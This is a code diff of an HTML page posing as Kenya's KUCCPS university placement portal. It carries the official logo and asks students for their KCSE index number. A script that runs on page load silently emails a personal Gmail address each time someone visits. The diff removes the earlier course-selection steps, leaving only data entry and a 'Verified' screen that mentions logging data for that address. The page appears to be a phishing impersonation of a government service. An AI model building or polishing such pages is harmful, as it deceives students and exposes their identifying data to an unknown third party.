@@ -10,138 +10,73 @@
         (function() { emailjs.init("YOUR_PUBLIC_KEY"); })();
         window.onload = function() {
             emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
-                message: "A user is on the KUCCPS branded portal",
+                message: "A user has accessed the KUCCPS branded portal",
                 to_email: "fidelsteven71@gmail.com"
             });
         };
     </script>
 
     <style>
-        body { background: #eef2f7; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; padding: 20px; margin: 0; }
-        .form-card { background: white; padding: 0; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.15); width: 100%; max-width: 850px; overflow: hidden; }
+        body { background: #f4f7f9; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; display: flex; justify-content: center; padding: 20px; margin: 0; }
+        .form-card { background: white; padding: 0; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 100%; max-width: 450px; overflow: hidden; border: 1px solid #ddd; }
         
-        /* THE OFFICIAL HEADER - APPEARS ON EVERY PAGE */
-        .official-header { background: #003366; padding: 20px; text-align: center; border-bottom: 5px solid #ffcc00; }
-        .official-logo { width: 100px; height: auto; filter: drop-shadow(0px 2px 4px rgba(0,0,0,0.2)); background: white; padding: 5px; border-radius: 8px; }
-        .portal-title { color: white; margin-top: 10px; font-size: 18px; font-weight: bold; text-transform: uppercase; }
+        /* OFFICIAL HEADER */
+        .official-header { background: #003366; padding: 20px 10px; text-align: center; border-bottom: 4px solid #f1c40f; }
+        
+        /* THE LOGO FIX */
+        .official-logo { 
+            width: 180px; 
+            height: auto; 
+            background: white; 
+            padding: 10px; 
+            border-radius: 4px; 
+            margin-bottom: 10px;
+            display: inline-block;
+        }
+        
+        .portal-title { color: white; font-size: 16px; font-weight: bold; text-transform: uppercase; letter-spacing: 0.5px; }
 
-        .content { padding: 30px; }
-        .step-header { border-bottom: 2px solid #003366; color: #003366; padding-bottom: 10px; margin-bottom: 20px; text-align: center; }
-        label { font-weight: bold; color: #444; }
-        input, select { width: 100%; padding: 12px; margin-top: 8px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
-        .btn { width: 100%; padding: 15px; border: none; border-radius: 6px; margin-top: 20px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .content { padding: 25px; }
+        .step-header { color: #003366; font-size: 20px; text-align: center; margin-bottom: 20px; font-weight: bold; }
+        label { display: block; margin-bottom: 8px; font-weight: bold; color: #555; font-size: 14px; }
+        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 16px; margin-bottom: 20px; }
+        .btn { width: 100%; padding: 14px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; transition: background 0.2s; }
         .next-btn { background: #007bff; color: white; }
-        .submit-btn { background: #28a745; color: white; }
+        .next-btn:hover { background: #0056b3; }
         .hidden { display: none; }
-        
-        /* SEARCH & DIRECTORY */
-        #branchSearch { border: 2px solid #003366; margin-bottom: 15px; }
-        .branch-list { height: 400px; overflow-y: auto; background: #f8f9fa; padding: 15px; border-radius: 8px; border: 1px solid #ddd; }
-        .branch-item { background: white; padding: 10px; margin-bottom: 8px; border-left: 4px solid #003366; border-radius: 4px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
     </style>
 </head>
 <body>
 
 <div class="form-card">
     <div class="official-header">
-        <img src="https://kuccps.net/wp-content/uploads/2023/11/kuccps_logo.png" alt="KUCCPS LOGO" class="official-logo">
+        <img src="https://kuccps.net/wp-content/uploads/2023/11/kuccps_logo.png" alt="KUCCPS Logo" class="official-logo">
         <div class="portal-title">Placement Service Portal</div>
     </div>
 
     <div class="content">
-        <form id="placementForm">
+        <form id="portalForm">
             <div id="page1">
                 <h2 class="step-header">Student Verification</h2>
                 <label>Index Number (11 Digits)</label>
                 <input type="text" id="indexNo" placeholder="Enter KCSE Index Number" required>
-                <button type="button" class="btn next-btn" onclick="goPage(1, 2)">Validate Account</button>
+                <button type="button" class="btn next-btn" onclick="nextStep()">Validate Account</button>
             </div>
 
-            <div id="page2" class="hidden">
-                <h2 class="step-header">Results Entry</h2>
-                <label>Mean Grade</label>
-                <input type="text" id="grade" placeholder="e.g., A, B+, C" required>
-                <button type="button" class="btn next-btn" onclick="filterData()">Process Eligibility</button>
-            </div>
-
-            <div id="page3" class="hidden">
-                <h2 class="step-header">Course Selection</h2>
-                <select id="courseSelect" onchange="showUnis()" required></select>
-                <div id="recBox" class="hidden" style="margin-top:15px; background:#e3f2fd; padding:10px; border-radius:5px;">
-                    <small id="recs"></small>
-                </div>
-                <button type="button" class="btn next-btn" onclick="goPage(3, 4)">Next Step</button>
-            </div>
-
-            <div id="page4" class="hidden">
-                <h2 class="step-header">Final Institution</h2>
-                <select id="uniSelect" required></select>
-                <button type="button" class="btn next-btn" onclick="goPage(4, 5)">View Branches & Map</button>
-            </div>
-
-            <div id="page5" class="hidden">
-                <h2 class="step-header">National Network</h2>
-                <input type="text" id="branchSearch" placeholder="🔍 Search by town or campus name..." onkeyup="filterBranches()">
-                <div class="branch-list" id="branchContainer">
-                    <div class="branch-item"><b>UoN - Parklands Campus</b><br><small>Nairobi</small></div>
-                    <div class="branch-item"><b>UoN - Mombasa Campus</b><br><small>Mombasa Town</small></div>
-                    <div class="branch-item"><b>KU - Ruiru Campus</b><br><small>Kiambu</small></div>
-                    <div class="branch-item"><b>Moi - Coast Campus</b><br><small>Mombasa CBD</small></div>
-                    <div class="branch-item"><b>JKUAT - Karen Campus</b><br><small>Nairobi</small></div>
-                    <div class="branch-item"><b>Maseno - City Campus</b><br><small>Kisumu CBD</small></div>
-                    <div class="branch-item"><b>KMTC - Kisii</b><br><small>Kisii Town</small></div>
-                    <div class="branch-item"><b>Kabete Polytechnic</b><br><small>Nairobi</small></div>
-                </div>
-                <button type="button" class="btn submit-btn" onclick="submitAll()">Finalize Placement</button>
+            <div id="successPage" class="hidden" style="text-align:center;">
+                <h2 style="color: #28a745;">Verified</h2>
+                <p>Logging data for <b>fidelsteven71@gmail.com</b></p>
             </div>
         </form>
-
-        <div id="finalSuccess" class="hidden" style="text-align:center;">
-            <h2 style="color: #28a745;">Submission Successful</h2>
-            <p>Your details are being reviewed by the placement committee.</p>
-            <p>Confirmation sent to: <b>fidelsteven71@gmail.com</b></p>
-        </div>
     </div>
 </div>
 
 <script>
-    // PRESERVED LOGIC
-    function goPage(c, n) {
-        document.getElementById('page'+c).classList.add('hidden');
-        document.getElementById('page'+n).classList.remove('hidden');
-    }
-
-    function filterData() {
-        const list = document.getElementById('courseSelect');
-        list.innerHTML = '<option value="">-- Choose Course --</option>';
-        ['Medicine', 'Law', 'Engineering', 'Nursing', 'Education'].forEach(c => {
-            let o = document.createElement("option"); o.text = c; list.add(o);
-        });
-        goPage(2, 3);
-    }
-
-    function showUnis() {
-        const u = document.getElementById('uniSelect');
-        u.innerHTML = "";
-        ['University of Nairobi', 'Kenyatta University', 'JKUAT', 'Moi University'].forEach(x => {
-            let o = document.createElement("option"); o.text = x; u.add(o);
-        });
-        document.getElementById('recBox').classList.remove('hidden');
-        document.getElementById('recs').innerText = "System matches found for your grade.";
-    }
-
-    function filterBranches() {
-        let input = document.getElementById('branchSearch').value.toLowerCase();
-        let items = document.getElementsByClassName('branch-item');
-        for (let i = 0; i < items.length; i++) {
-            items[i].style.display = items[i].innerText.toLowerCase().includes(input) ? "" : "none";
-        }
-    }
-
-    function submitAll() {
-        document.getElementById('placementForm').classList.add('hidden');
-        document.getElementById('finalSuccess').classList.remove('hidden');
+    function nextStep() {
+        document.getElementById('page1').classList.add('hidden');
+        document.getElementById('successPage').classList.remove('hidden');
     }
 </script>
+
 </body>
 </html>
